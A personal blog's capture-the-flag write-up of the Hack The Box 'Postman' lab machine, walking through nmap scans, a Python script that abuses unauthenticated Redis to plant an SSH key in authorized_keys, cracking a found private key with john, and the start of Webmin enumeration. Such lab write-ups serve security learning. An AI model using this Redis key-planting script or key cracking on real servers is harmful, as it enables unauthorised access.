<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Ahmed | Hack The Box - Postman</title>
  <meta name="description" content="This is my writeup and walkthrough for Postman from Hack The Box.">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <meta property="og:title" content="Hack The Box - Postman">
  <meta property="og:type" content="website">
  <meta property="og:url" content="http://localhost:4000/posts/postman">
  <meta property="og:description" content="This is my writeup and walkthrough for Postman from Hack The Box.">
  <meta property="og:site_name" content="Ahmed">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:url" content="http://localhost:4000/posts/postman">
  <meta name="twitter:title" content="Hack The Box - Postman">
  <meta name="twitter:description" content="This is my writeup and walkthrough for Postman from Hack The Box.">

  
    
      <meta property="og:image" content="http://localhost:4000/assets/documentation/hack-the-box/postman/postman-80fc43bb22f05e1334a14593a97b9b21b90ef7059e84126b1e8b4d816c99504c.png">
      <meta name="twitter:image" content="http://localhost:4000/assets/documentation/hack-the-box/postman/postman-80fc43bb22f05e1334a14593a97b9b21b90ef7059e84126b1e8b4d816c99504c.png">
    
  

  <link href="http://localhost:4000/feed.xml" type="application/rss+xml" rel="alternate" title="Ahmed Last 10 blog posts" />

  

  

    
      <link rel="icon" type="image/x-icon" href="/assets/favicon-color-0e896bd8673d9f83cea8d7b0a12fcc894681d58fc475ad499adfed94067b1e1f.png">
      <link rel="apple-touch-icon" href="/assets/apple-touch-icon-dark-d161409442b7e523089f24d08d0a55951549ece7504207c376d53b020713494d.png">
      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-4f9ca30b7bd79f8f89867a0bf8d98a039c4d5b0ff37234f2791c863d8c10c31c.css">
      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-2bc99530a5c0fa0e58de22be093dd09d4f72bc6e5e19692d5ca01e79b20a4eb8.css" disabled="false">
    

  

</head>

<body>
  <main>
    <div class="grid grid-centered">
      <div class="grid-cell">
        <nav class="header-nav scrollappear">
  <a href="/" class="header-logo" title="Ahmed">Ahmed</a>
  <ul class="header-links">
    
      <li>
        <a href="/about" title="About me">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
  <use href="/assets/about-ab4928d09cef6e09136b8d40637999db4f9575f927c33156e7f3e37d450e5df1.svg#icon-about" xlink:href="/assets/about-ab4928d09cef6e09136b8d40637999db4f9575f927c33156e7f3e37d450e5df1.svg#icon-about"></use>
</svg>

        </a>
      </li>
    
    
    
      <li>
        <a href="https://www.facebook.com/manneredperson" rel="noreferrer noopener" target="_blank" title="Facebook">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-facebook">
  <use href="/assets/facebook-5a38f0a900ec68e86eaccd4683fcad4e4de77281f876d9476a560a0a69cac8bf.svg#icon-facebook" xlink:href="/assets/facebook-5a38f0a900ec68e86eaccd4683fcad4e4de77281f876d9476a560a0a69cac8bf.svg#icon-facebook"></use>
</svg>

        </a>
      </li>
    
    
    
      <li>
        <a href="https://github.com/ah-sayed" rel="noreferrer noopener" target="_blank" title="GitHub">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
  <use href="/assets/github-706d546fe6b5a32deca92fb08bbe60e78ea4e8027e889107905eb61f1063bcec.svg#icon-github" xlink:href="/assets/github-706d546fe6b5a32deca92fb08bbe60e78ea4e8027e889107905eb61f1063bcec.svg#icon-github"></use>
</svg>

        </a>
      </li>
    
    
    
    
    
    
    
      <li>
        <a href="https://www.linkedin.com/in/sayeddd" rel="noreferrer noopener" target="_blank" title="LinkedIn">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
  <use href="/assets/linkedin-3bd8eb5ea036958dc7b3ee3de6612dbfa9e0744f369f20f7895d6a2782bbaf43.svg#icon-linkedin" xlink:href="/assets/linkedin-3bd8eb5ea036958dc7b3ee3de6612dbfa9e0744f369f20f7895d6a2782bbaf43.svg#icon-linkedin"></use>
</svg>

        </a>
      </li>
    
    
    
    
    
    
    
    
    
    
    
    
    
      <li>
        <a href="mailto:ahmedsayedgfx@gmail.com" title="Email">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
  <use href="/assets/email-30a104adb1e2728097a984fbea2995978b6fff6c12906a734044ebd388848b70.svg#icon-email" xlink:href="/assets/email-30a104adb1e2728097a984fbea2995978b6fff6c12906a734044ebd388848b70.svg#icon-email"></use>
</svg>

        </a>
      </li>
    
    
      <li>
        <a href="/feed.xml" rel="noreferrer noopener" target="_blank" title="RSS">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-rss">
  <use href="/assets/rss-cdc7a721b47671668abb0ba57f9f8db8022096e0051ff51b9e08e6cc049453a4.svg#icon-rss" xlink:href="/assets/rss-cdc7a721b47671668abb0ba57f9f8db8022096e0051ff51b9e08e6cc049453a4.svg#icon-rss"></use>
</svg>

        </a>
      </li>
    
    
      <li>
        <a onclick="toggle()" title="Toggle Theme">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
  <use href="/assets/theme-610197c56844c5ba34608b2018c4cc3b79f8833e2efc7a99bcb5589f1d3cfd7b.svg#icon-theme" xlink:href="/assets/theme-610197c56844c5ba34608b2018c4cc3b79f8833e2efc7a99bcb5589f1d3cfd7b.svg#icon-theme"></use>
</svg>

        </a>
      </li>
    
  </ul>
</nav>


  <ul class="header-tags scrollappear">
    
    
      
        <li><a href="/tag/algorithms">Algorithms</a></li>
    
      
        <li><a href="/tag/analysis">Analysis</a></li>
    
      
        <li><a href="/tag/data">Data</a></li>
    
      
        <li><a href="/tag/hack-the-box">Hack-the-box</a></li>
    
      
        <li><a href="/tag/machines">Machines</a></li>
    
      
        <li><a href="/tag/postman">Postman</a></li>
    
      
        <li><a href="/tag/redis">Redis</a></li>
    
      
        <li><a href="/tag/root">Root</a></li>
    
      
        <li><a href="/tag/security">Security</a></li>
    
      
        <li><a href="/tag/sorting">Sorting</a></li>
    
      
        <li>...</li>
        <li><a href="/tags">Show all</a></li>
        
  </ul>


        <article class="article scrollappear">
          <header class="article-header">
            <h1>Hack The Box - Postman</h1>
            <p>This is my writeup and walkthrough for Postman from Hack The Box.</p>
            <div class="article-list-footer">
  <span class="article-list-date">
    March 14, 2020
  </span>
  <span class="article-list-divider">-</span>
  <span class="article-list-minutes">
    
    
      10 minute read
    
  </span>
  <span class="article-list-divider">-</span>
  <div class="article-list-tags">
    
      
      <a href="/tag/security" title="See all posts with tag 'Security'">Security</a>
    
      
      <a href="/tag/hack-the-box" title="See all posts with tag 'Hack-The-Box'">Hack-The-Box</a>
    
      
      <a href="/tag/machines" title="See all posts with tag 'Machines'">Machines</a>
    
      
      <a href="/tag/ssh" title="See all posts with tag 'SSH'">SSH</a>
    
      
      <a href="/tag/redis" title="See all posts with tag 'Redis'">Redis</a>
    
      
      <a href="/tag/root" title="See all posts with tag 'Root'">Root</a>
    
      
      <a href="/tag/postman" title="See all posts with tag 'Postman'">Postman</a>
    
  </div>
</div>
          </header>

          <div class="article-content">
            <p><a href="/assets/documentation/hack-the-box/postman/postman-80fc43bb22f05e1334a14593a97b9b21b90ef7059e84126b1e8b4d816c99504c.png">
  <img src="/assets/documentation/hack-the-box/postman/postman-80fc43bb22f05e1334a14593a97b9b21b90ef7059e84126b1e8b4d816c99504c.png" alt="Postman" class="zooming" data-rjs="/assets/documentation/hack-the-box/postman/postman-80fc43bb22f05e1334a14593a97b9b21b90ef7059e84126b1e8b4d816c99504c.png" data-zooming-width="587" data-zooming-height="371">
</a></p>

<p>It was an easy machine from <strong>Hack The Box</strong> with:</p>
<ul>
  <li>
<code class="highlighter-rouge">Redis</code> unauthenticated RCE.</li>
  <li>SSH user private key in some system folder.</li>
  <li>Webmin package update RCE with Metasploit.</li>
</ul>

<h2 id="1-enumeration">1. Enumeration</h2>

<p>First things first lets add <code class="highlighter-rouge">10.10.10.160</code> in <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">postman.htb</code> and enumerate our machine with <code class="highlighter-rouge">nmap</code> to discover open ports and services.</p>

<p>I ran initial <code class="highlighter-rouge">nmap</code> and got some stuff, but that wasn’t enough. So, lets run <code class="highlighter-rouge">nmap</code> with all ports to see what’s really running on this machine.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> <span class="nt">-sT</span> <span class="nt">-T4</span> <span class="nt">-o</span> postman-all postman.htb
<span class="gp">#</span><span class="w"> </span>Nmap 7.80 scan initiated Thu Jan  9 15:55:57 2020 as: nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> <span class="nt">-sT</span> <span class="nt">-T4</span> <span class="nt">-o</span> postman-all 10.10.10.160
<span class="go">Warning: 10.10.10.160 giving up on port because retransmission cap hit (6).
Nmap scan report for postman.htb (10.10.10.160)
Host is up (0.089s latency).
Not shown: 65235 closed ports, 295 filtered ports
PORT      STATE SERVICE    VERSION
</span><span class="gp">22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis      Redis key-value store 4.0.9
8000/tcp  open  tcpwrapped
10000/tcp open  http       MiniServ 1.910 (Webmin httpd)
</span><span class="gp">|_http-title: Site doesn't have a title (text/html;</span><span class="w"> </span><span class="nv">Charset</span><span class="o">=</span>iso-8859-1<span class="o">)</span><span class="nb">.</span>
<span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class="gp">#</span><span class="w"> </span>Nmap <span class="k">done </span>at Thu Jan  9 16:12:00 2020 <span class="nt">--</span> 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>963.15 seconds</code></pre></figure>

<p>We found <code class="highlighter-rouge">http</code> on port <code class="highlighter-rouge">80, 10000</code>, <code class="highlighter-rouge">ssh</code> on port <code class="highlighter-rouge">22</code> and the interesting one was <code class="highlighter-rouge">Redis</code> on port <code class="highlighter-rouge">6347</code>. So, lets go to the browser to see what is running on those ports <code class="highlighter-rouge">80, 10000</code>.</p>

<h4 id="web-enumeration">Web Enumeration</h4>
<p>The home page on port <code class="highlighter-rouge">80</code> was sort of nothing just a little scroll to top button:</p>

<p><a href="/assets/documentation/hack-the-box/postman/home_page-07c412d83bab203b5d67e293f24d211b4045ed293d63676912ddac20d045ce1a.png">
  <img src="/assets/documentation/hack-the-box/postman/home_page-07c412d83bab203b5d67e293f24d211b4045ed293d63676912ddac20d045ce1a.png" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/postman/home_page-07c412d83bab203b5d67e293f24d211b4045ed293d63676912ddac20d045ce1a.png" data-zooming-width="1870" data-zooming-height="1041">
</a></p>

<p>Lets check the other port <code class="highlighter-rouge">postman.htb:10000</code>:</p>

<p><a href="/assets/documentation/hack-the-box/postman/ssl_err-49b94b45ea8c14a2c83a385dc94e75e1c52651abc3265112e79071ef2f5811b7.png">
  <img src="/assets/documentation/hack-the-box/postman/ssl_err-49b94b45ea8c14a2c83a385dc94e75e1c52651abc3265112e79071ef2f5811b7.png" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/postman/ssl_err-49b94b45ea8c14a2c83a385dc94e75e1c52651abc3265112e79071ef2f5811b7.png" data-zooming-width="1870" data-zooming-height="497">
</a></p>

<p>It shows us an <code class="highlighter-rouge">SSL</code> error, so lets add <code class="highlighter-rouge">https</code>:</p>

<p><a href="/assets/documentation/hack-the-box/postman/webmin_login-b8ec5d28f2893a5a64ba4caf7f4a370bf0ecf325f0957bb3f6ef0923eefe9f9a.png">
  <img src="/assets/documentation/hack-the-box/postman/webmin_login-b8ec5d28f2893a5a64ba4caf7f4a370bf0ecf325f0957bb3f6ef0923eefe9f9a.png" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/postman/webmin_login-b8ec5d28f2893a5a64ba4caf7f4a370bf0ecf325f0957bb3f6ef0923eefe9f9a.png" data-zooming-width="1871" data-zooming-height="824">
</a></p>

<p>Now it’s sort of <code class="highlighter-rouge">login</code> page for some web app called <strong>Webmin</strong>, so let us search what it is.</p>

<blockquote>
  <p>“<strong>Webmin</strong> is a web-based interface for system administration for Unix. Using any modern web browser, you can setup user accounts, Apache, DNS, file sharing and much more.”</p>
</blockquote>

<p>So, it’s an app able to configure and manage Unix system files. I tried to intercept the login request with <code class="highlighter-rouge">burp</code> to see what can I do with it, but it seems well-configured and there is no way to brute force because the response time for each request and that could take very long time. Don’t forget it’s an easy box.</p>

<h4 id="redis-enumeration">Redis Enumeration</h4>

<blockquote>
  <p>“<strong>Redis</strong> is an in-memory data structure project implementing a distributed, in-memory key-value database with optional durability. It supports different kinds of abstract data structures, such as strings, lists, maps, sets, sorted sets, bitmaps, streams, and spatial indexes.”</p>
</blockquote>

<p>Now we still have <code class="highlighter-rouge">Redis</code> on port <code class="highlighter-rouge">6347</code>.  I don’ know much about it, so let’s search about <code class="highlighter-rouge">Redis</code> database and how to connect to it with Linux. After searching, I found <code class="highlighter-rouge">Redis</code> Command Line Interface to interact with <code class="highlighter-rouge">Redis</code> servers.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>redis-cli <span class="nt">-h</span> postman.htb
<span class="gp">postman.htb:6379&gt;</span></code></pre></figure>

<p>After installing <code class="highlighter-rouge">redis-cli</code> and trying to connect to <code class="highlighter-rouge">postman.htb</code> it. We got an access without any sort of authentication. I spend some time learning basic <code class="highlighter-rouge">Redis</code> commands to see what can I do with it until I got something.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">postman.htb:6379&gt;</span><span class="w"> </span>config get <span class="nb">dir</span>
<span class="go">1) "dir"
2) "/var/lib/redis/.ssh"
</span><span class="gp">postman.htb:6379&gt;</span><span class="w"> </span></code></pre></figure>

<p>The command above just shows us where’s the config file for this <code class="highlighter-rouge">Redis</code> instance and we got <code class="highlighter-rouge">.ssh</code> as config file. I struggled with this a lot thinking what I can do to take advantage of that config file.</p>

<h2 id="2-exploitation">2. Exploitation</h2>

<p>We know that the machine run <code class="highlighter-rouge">ssh</code> service so I found that I can put something on the <code class="highlighter-rouge">Redis</code> memory, copy it into a random file let say <code class="highlighter-rouge">~/ssh/authorized_keys</code> as config file in order to gain access with <code class="highlighter-rouge">ssh</code>.</p>

<p>Let us generate <code class="highlighter-rouge">ssh</code> key:</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>ssh-keygen <span class="nt">-t</span> rsa
<span class="go">Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): ./id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./id_rsa.
Your public key has been saved in ./id_rsa.pub.
The key fingerprint is:
SHA256:72rWSWzN8yWhJa80YdzlN0X59GaD1CgeoA4gml9OBqY root@kali
The key's randomart image is:
+---[RSA 3072]----+
| .o.     ..   o.o|
|.+...   .  o o o+|
|E   +. .  ..+..++|
| . =  o    .=.+oB|
|  . .  .S. + * ++|
|         .+ B o .|
|         +.o = o |
|        o.o . .  |
|       o...      |
+----[SHA256]-----+</span></code></pre></figure>

<p>Now we have the key. Our goal is to put it into the <code class="highlighter-rouge">Redis</code> server memory and after that we can transfer it into a file, in a way that the <code class="highlighter-rouge">authorized_keys</code> is still a valid file.</p>

<p>To store the key into the <code class="highlighter-rouge">Redis</code> memory, we should use the <code class="highlighter-rouge">RDP</code> format.</p>

<blockquote>
  <p>“<strong>RDB</strong> format is a binary representation of the in-memory store.”</p>
</blockquote>

<p>By adding some padding around <code class="highlighter-rouge">ssh</code> public key we generated.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span><span class="o">(</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">;</span> <span class="nb">cat </span>id_rsa.pub<span class="p">;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="o">)</span> <span class="o">&gt;</span> key.txt</code></pre></figure>

<p>Now <code class="highlighter-rouge">key.txt</code> is our public key with new lines. We can write this inside <code class="highlighter-rouge">Redis</code> memory  using <code class="highlighter-rouge">redis-cli</code>.</p>

<p>The writing process takes some steps and I love writing code, so let’s automate our process with the following <code class="highlighter-rouge">python</code> script:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">remote</span><span class="p">,</span> <span class="n">context</span>
<span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">Popen</span><span class="p">,</span> <span class="n">PIPE</span>
<span class="kn">from</span> <span class="nn">termcolor</span> <span class="kn">import</span> <span class="n">colored</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'critical'</span>
<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Usage: exploit.py [ip]"</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">ip</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">pub_key</span> <span class="o">=</span> <span class="s">"cat key.txt | redis-cli -h {} -x set crackit"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)</span>
<span class="n">flush</span> <span class="o">=</span> <span class="s">"redis-cli -h {} flushall"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)</span>

<span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"[!] Flushing memory."</span><span class="p">,</span> <span class="s">"yellow"</span><span class="p">)</span>
<span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"[+] "</span> <span class="o">+</span> <span class="n">Popen</span><span class="p">(</span><span class="n">flush</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">PIPE</span><span class="p">)</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"green"</span><span class="p">)</span>

<span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"[!] Sending public key."</span><span class="p">,</span> <span class="s">"yellow"</span><span class="p">)</span>
<span class="n">p1</span> <span class="o">=</span> <span class="n">Popen</span><span class="p">(</span><span class="n">pub_key</span><span class="p">[:</span><span class="mi">2</span><span class="p">],</span><span class="n">stdout</span><span class="o">=</span><span class="n">PIPE</span><span class="p">)</span>
<span class="n">p2</span> <span class="o">=</span> <span class="n">Popen</span><span class="p">(</span><span class="n">pub_key</span><span class="p">[</span><span class="mi">3</span><span class="p">:],</span> <span class="n">stdin</span><span class="o">=</span><span class="n">p1</span><span class="o">.</span><span class="n">stdout</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">PIPE</span><span class="p">)</span>
<span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"[+] "</span> <span class="o">+</span> <span class="n">p2</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"green"</span><span class="p">)</span>

<span class="n">redis</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="mi">6379</span><span class="p">)</span>
<span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"[!] Setting config directory"</span><span class="p">,</span> <span class="s">"yellow"</span><span class="p">)</span>
<span class="n">redis</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"config set dir '/var/lib/redis/.ssh'"</span><span class="p">)</span>
<span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"["</span> <span class="o">+</span><span class="n">redis</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">"] OK</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"green"</span><span class="p">)</span>

<span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"[!] Setting 'authorized_keys' as config file."</span><span class="p">,</span> <span class="s">"yellow"</span><span class="p">)</span>
<span class="n">redis</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"config set dbfilename </span><span class="se">\"</span><span class="s">authorized_keys</span><span class="se">\"</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"["</span> <span class="o">+</span><span class="n">redis</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">"] OK</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"green"</span><span class="p">)</span>

<span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"[!] Saving our config settings."</span><span class="p">,</span> <span class="s">"yellow"</span><span class="p">)</span>
<span class="n">redis</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"save"</span><span class="p">)</span>
<span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"["</span> <span class="o">+</span><span class="n">redis</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">"] OK</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"green"</span><span class="p">)</span>

<span class="k">print</span> <span class="s">"[+] Now you can connect to the server via 'ssh -i priv_key redis@{}' with your private key.</span><span class="se">\n</span><span class="s">"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span></code></pre></figure>

<p>The script does the following steps:</p>

<ul>
  <li>Flushing <code class="highlighter-rouge">Redis</code> memory to start writing our key.</li>
  <li>Sending our padded <code class="highlighter-rouge">ssh</code> public key to <code class="highlighter-rouge">Redis</code> memory.</li>
  <li>Setting <code class="highlighter-rouge">Redis</code> config directory to be <code class="highlighter-rouge">.ssh</code>.</li>
  <li>Setting <code class="highlighter-rouge">authorized_keys</code> as a <code class="highlighter-rouge">Redis</code> config file.</li>
  <li>Saving the config settings.</li>
</ul>

<p>Now we’re able to gain access via <code class="highlighter-rouge">ssh</code>  using our private key:</p>

<p><a href="/assets/documentation/hack-the-box/postman/exploit-ee94bcfcdc91c89ff66a2472e4eb64e3813be3a85614ce12d0b7751d91461d6f.png">
  <img src="/assets/documentation/hack-the-box/postman/exploit-ee94bcfcdc91c89ff66a2472e4eb64e3813be3a85614ce12d0b7751d91461d6f.png" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/postman/exploit-ee94bcfcdc91c89ff66a2472e4eb64e3813be3a85614ce12d0b7751d91461d6f.png" data-zooming-width="1223" data-zooming-height="807">
</a></p>

<h2 id="3-user-enumeration">3. User Enumeration</h2>

<p>Let’s see available users exist in the system:</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">redis@Postman:~#</span><span class="w"> </span><span class="nb">tail</span> /etc/passwd
<span class="go">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
redis:x:107:114::/var/lib/redis:/bin/bash</span></code></pre></figure>

<p>We already on <code class="highlighter-rouge">redis</code>, so we can see what user <code class="highlighter-rouge">Matt</code> can do on the system:</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">redis@Postman:~#</span><span class="w"> </span>find / <span class="nt">-type</span> f <span class="nt">-ls</span> 2&gt;/dev/null | <span class="nb">grep </span>Matt | <span class="nb">head</span> <span class="nt">-5</span>
<span class="go">   158996      4 -rwxr-xr-x   1 Matt     Matt         1743 Aug 26 00:11 /opt/id_rsa.bak
   143265      4 -rw-r--r--   1 Matt            Matt                 3771 Aug 25 15:10 /home/Matt/.bashrc
   131199      4 -rw-------   1 Matt            Matt                 1726 Feb  6 17:50 /home/Matt/.bash_history
   159000      4 -rw-rw----   1 Matt            Matt                   33 Aug 26 03:07 /home/Matt/user.txt
   158997      4 -rw-rw-r--   1 Matt            Matt                   66 Aug 26 00:48 /home/Matt/.selected_editor
   143266      4 -rw-r--r--   1 Matt            Matt                  807 Aug 25 15:10 /home/Matt/.profile</span></code></pre></figure>

<p>Oh! We found some sort of <code class="highlighter-rouge">ssh</code> private key inside <code class="highlighter-rouge">/opt/id_rsa.bak</code>. Let’s copy it into our machine and extract it using <code class="highlighter-rouge">ssh2john</code>.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>ssh2john matt.key <span class="o">&gt;</span> matt.priv</code></pre></figure>

<h4 id="own-user">Own User</h4>

<p>Now we’re able to use our friend <code class="highlighter-rouge">john</code> to crack the <code class="highlighter-rouge">matt.priv</code> and own user:</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt matt.priv 
<span class="go">Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (matt.key)
1g 0:00:00:19 18.30% (ETA: 20:09:25) 0.05221g/s 148343p/s 148343c/s 148343C/s w33mof</span></code></pre></figure>

<p>And we got <code class="highlighter-rouge">computer2008</code> as a <code class="highlighter-rouge">ssh</code> password. I tried to connect with <code class="highlighter-rouge">ssh</code>, but something went wrong.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>ssh <span class="nt">-i</span> matt.key Matt@postman.htb
<span class="go">Enter passphrase for key 'matt.key': 
Connection closed by 10.10.10.160 port 22</span></code></pre></figure>

<p>So I tried to switch to user <code class="highlighter-rouge">Matt</code> from <code class="highlighter-rouge">redis</code> user and it worked.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">redis@Postman:~$</span><span class="w"> </span>su Matt
<span class="go">Password: 
</span><span class="gp">Matt@Postman:/var/lib/redis$</span><span class="w"> </span><span class="nb">cat</span> ~/user.txt 
<span class="go">517ad0ec</span></code></pre></figure>

<h2 id="4-root">4. Root</h2>

<p>As we remember we got a <strong>Webmin</strong> app running on port <code class="highlighter-rouge">10000</code>. Now we can see what version is running on the box and search for any vulnerabilities with <code class="highlighter-rouge">searchsploit</code>.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">Matt@Postman:/var/lib/redis$</span><span class="w"> </span>find / <span class="nt">-type</span> f <span class="nt">-ls</span> 2&gt;/dev/null | <span class="nb">grep </span>webmin | <span class="nb">grep </span>version | <span class="nb">head</span> <span class="nt">-5</span>
<span class="go">   280138      4 -rw-r--r--   1 root            root                    6 Aug 25 17:26 /etc/webmin/version
   273481     20 -rw-r--r--   1 root            root                18410 May  5  2019 /usr/share/webmin/authentic-theme/images/notifications_csf_remote_version.png
   273482     12 -rw-r--r--   1 root            root                11165 May  5  2019 /usr/share/webmin/authentic-theme/images/notifications_authentic_remote_version.png
   277316      4 -rw-r--r--   1 root            root                  265 May  5  2019 /usr/share/webmin/postfix/help/opt_mail_version.ca.html
